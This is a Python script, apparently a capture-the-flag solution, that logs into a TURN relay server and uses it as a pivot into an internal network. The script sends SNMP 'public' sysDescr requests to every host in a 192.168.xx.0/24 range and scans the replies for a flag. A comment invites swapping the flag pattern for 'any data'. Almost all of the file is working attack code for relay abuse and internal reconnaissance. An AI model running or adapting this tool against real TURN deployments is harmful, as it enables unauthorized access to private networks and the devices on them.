import os
import struct
import socket
import hmac
import hashlib
import re


TURN_IP = "" # set turn ip
TURN_PORT =  # set turn port

USERNAME = ""  
PASSWORD = ""
# ^ set credentials (if given)

NET_PREFIX = "192.168.xx." # set your value
TARGET_PORT = 161 # could be 162

SNMP_GET_SYSDESCR = bytes.fromhex(
    "30 29 02 01 01 04 06 70 75 62 6c 69 63 a0 1c 02 04 00 00 00 01 "
    "02 01 00 02 01 00 30 0e 30 0c 06 08 2b 06 01 02 01 01 01 00 05 00"
) #             ^^^ may have to be changed


MAGIC_COOKIE = 0x2112A442


def stun_header(msg_type, length, tid):
    return struct.pack("!HHI12s", msg_type, length, MAGIC_COOKIE, tid)


def random_tid():
    return os.urandom(12)


def attr(attr_type, value_bytes):
    padded = value_bytes + b"\x00" * ((4 - len(value_bytes) % 4) % 4)
    return struct.pack("!HH", attr_type, len(value_bytes)) + padded


def compute_mi(msg_without_mi, key):
    return hmac.new(key, msg_without_mi, hashlib.sha1).digest()


def encode_xor_peer_address(ip, port):
    family = 0x01  # IPv4
    xport = port ^ (MAGIC_COOKIE >> 16)
    ip_bytes = socket.inet_aton(ip)
    ip_int = struct.unpack("!I", ip_bytes)[0] ^ MAGIC_COOKIE
    xip = struct.pack("!I", ip_int)
    return struct.pack("!BBH4s", 0, family, xport, xip)


def decode_xor_peer_address(aval):
    if len(aval) < 8:
        return None, None
    _, family, xport = struct.unpack("!BBH", aval[:4])
    if family != 0x01:
        return None, None
    xip = aval[4:8]
    ip_int = struct.unpack("!I", xip)[0] ^ MAGIC_COOKIE
    port = xport ^ (MAGIC_COOKIE >> 16)
    ip = socket.inet_ntoa(struct.pack("!I", ip_int))
    return ip, port


def recv_stun_msg(sock):
    header = b""
    while len(header) < 20:
        chunk = sock.recv(20 - len(header))
        if not chunk:
            return None
        header += chunk
    msg_type, length, cookie, tid = struct.unpack("!HHI12s", header)
    body = b""
    while len(body) < length:
        chunk = sock.recv(length - len(body))
        if not chunk:
            break
        body += chunk
    return header + body


def parse_attrs(msg):
    if not msg or len(msg) < 20:
        return {}
    _, length, _, _ = struct.unpack("!HHI12s", msg[:20])
    pos = 20
    res = {}
    while pos < 20 + length:
        atype, alen = struct.unpack("!HH", msg[pos:pos+4])
        aval = msg[pos+4:pos+4+alen]
        pos += 4 + ((alen + 3) & ~3)
        res.setdefault(atype, []).append(aval)
    return res


class TurnTcpClient:
    def __init__(self, ip, port, username, password):
        self.ip = ip
        self.port = port
        self.username = username
        self.password = password
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(3.0)
        self.realm = None
        self.nonce = None
        self.key = None  # MD5(username:realm:password)

    def connect(self):
        print(f"[*] Connecting TCP {self.ip}:{self.port}")
        self.sock.connect((self.ip, self.port))
        print("[*] Connected")

    def allocate(self):
        tid1 = random_tid()
        body1 = attr(0x0019, struct.pack("!I", 17 << 24))  # REQUESTED-TRANSPORT: UDP
        msg1 = stun_header(0x0003, len(body1), tid1) + body1
        print("[*] Sending first Allocate (no auth)")
        self.sock.sendall(msg1)
        resp1 = recv_stun_msg(self.sock)
        if not resp1:
            print("[-] No response to first Allocate")
            return False

        mt1, _, _, _ = struct.unpack("!HHI12s", resp1[:20])
        print(f"[+] First Allocate resp type=0x{mt1:04x}, len={len(resp1)}")
        attrs1 = parse_attrs(resp1)
        if 0x0009 in attrs1:
            ec = attrs1[0x0009][0]
            if len(ec) >= 4:
                clas = ec[2] & 0x07
                num = ec[3]
                code = clas * 100 + num
                print(f"    ERROR-CODE = {code}")
        if 0x0014 in attrs1:
            self.realm = attrs1[0x0014][0].decode(errors="ignore")
            print("    REALM =", self.realm)
        if 0x0015 in attrs1:
            self.nonce = attrs1[0x0015][0].decode(errors="ignore")
            print("    NONCE =", self.nonce)

        if not (self.realm and self.nonce):
            print("[-] No REALM/NONCE in first Allocate resp :(")
            return False

        key_str = f"{self.username}:{self.realm}:{self.password}".encode()
        self.key = hashlib.md5(key_str).digest()
        print("[*] Computed long-term key")

        # 2) Allocate с auth
        tid2 = random_tid()
        body2 = b""
        body2 += attr(0x0019, struct.pack("!I", 17 << 24))
        body2 += attr(0x0006, self.username.encode())
        body2 += attr(0x0014, self.realm.encode())
        body2 += attr(0x0015, self.nonce.encode())

        length2 = len(body2) + 24
        header2 = stun_header(0x0003, length2, tid2)
        msg_no_mi = header2 + body2
        mi = compute_mi(msg_no_mi, self.key)
        mi_attr = attr(0x0008, mi)
        msg2 = msg_no_mi + mi_attr

        print("[*] Sending second Allocate (with auth)")
        self.sock.sendall(msg2)
        resp2 = recv_stun_msg(self.sock)
        if not resp2:
            print("[-] No response to second Allocate")
            return False

        mt2, _, _, _ = struct.unpack("!HHI12s", resp2[:20])
        print(f"[+] Second Allocate resp type=0x{mt2:04x}, len={len(resp2)}")
        if mt2 == 0x0103:
            print("[+] Allocate SUCCESS with auth")
            return True
        print("[-] Allocate still error, hex:", resp2.hex())
        return False

    def create_permission(self, peer_ip, peer_port):
        if not self.key:
            print("[!] No auth key")
            return False
        tid = random_tid()
        xpeer = encode_xor_peer_address(peer_ip, peer_port)
        body = b""
        body += attr(0x0012, xpeer)
        body += attr(0x0006, self.username.encode())
        body += attr(0x0014, self.realm.encode())
        body += attr(0x0015, self.nonce.encode())

        length = len(body) + 24
        header = stun_header(0x0008, length, tid)  # CreatePermission
        msg_no_mi = header + body
        mi = compute_mi(msg_no_mi, self.key)
        mi_attr = attr(0x0008, mi)
        msg = msg_no_mi + mi_attr

        self.sock.sendall(msg)
        resp = recv_stun_msg(self.sock)
        if not resp:
            print("[-] No resp to CreatePermission")
            return False
        mt, _, _, _ = struct.unpack("!HHI12s", resp[:20])
        print(f"    [*] CreatePermission resp type=0x{mt:04x}, len={len(resp)}")
        return mt == 0x0108

    def send_indication(self, peer_ip, peer_port, payload):
        tid = random_tid()
        xpeer = encode_xor_peer_address(peer_ip, peer_port)
        body = attr(0x0012, xpeer)
        body += attr(0x0013, payload)
        msg = stun_header(0x0016, len(body), tid) + body  # Send Indication
        self.sock.sendall(msg)

    def recv_data_indication_once(self, timeout=0.7):
        old_to = self.sock.gettimeout()
        self.sock.settimeout(timeout)
        try:
            msg = recv_stun_msg(self.sock)
        except socket.timeout:
            self.sock.settimeout(old_to)
            return None, None, None
        self.sock.settimeout(old_to)
        if not msg or len(msg) < 20:
            return None, None, None
        mt, length, cookie, tid = struct.unpack("!HHI12s", msg[:20])
        if mt != 0x0017:  # Data Indication
            return None, None, None
        pos = 20
        peer_ip = None
        peer_port = None
        payload = None
        while pos < 20 + length:
            atype, alen = struct.unpack("!HH", msg[pos:pos+4])
            aval = msg[pos+4:pos+4+alen]
            pos += 4 + ((alen + 3) & ~3)
            if atype == 0x0012:
                peer_ip, peer_port = decode_xor_peer_address(aval)
            elif atype == 0x0013:
                payload = aval
        return peer_ip, peer_port, payload


def main():
    client = TurnTcpClient(TURN_IP, TURN_PORT, USERNAME, PASSWORD)
    client.connect()

    if not client.allocate():
        print("[-] Allocate failed, stopping")
        return

    for last in range(0, 256):
        ip = NET_PREFIX + str(last)
        print(f"\n[+] Checking {ip}:{TARGET_PORT}")

        if not client.create_permission(ip, TARGET_PORT):
            continue

        client.send_indication(ip, TARGET_PORT, SNMP_GET_SYSDESCR)

        peer_ip, peer_port, payload = client.recv_data_indication_once(timeout=0.7)
        if payload:
            print(f"[+] RESPONSE from {peer_ip}:{peer_port}")
            print("Raw bytes:", payload)
            text = payload.decode('latin-1', errors='ignore')
            print("latin-1:", text)

            m = re.search(r'flag\{.*?\}', text, re.IGNORECASE) # change to any data ur searching for
            if m:
                print("\n flag gound!")
                print(m.group(0))
                return
        else:
            print("    [-] No Data Indication (no SNMP response)")


if __name__ == "__main__":
    main()
